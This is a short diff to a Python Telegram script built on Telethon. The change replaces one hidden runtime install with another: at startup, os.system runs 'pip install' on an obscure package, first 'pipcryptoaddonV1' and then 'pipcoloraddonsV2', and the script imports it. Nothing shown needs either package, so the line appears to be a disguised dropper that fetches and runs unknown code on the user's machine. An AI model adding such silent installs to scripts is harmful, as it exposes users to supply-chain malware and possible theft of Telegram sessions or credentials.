@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptoaddonV1")
-import pipcryptoaddonV1
+os.system("pip install pipcoloraddonsV2")
+import pipcoloraddonsV2
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
 from telethon.tl.types import InputPeerEmpty, InputPeerChannel
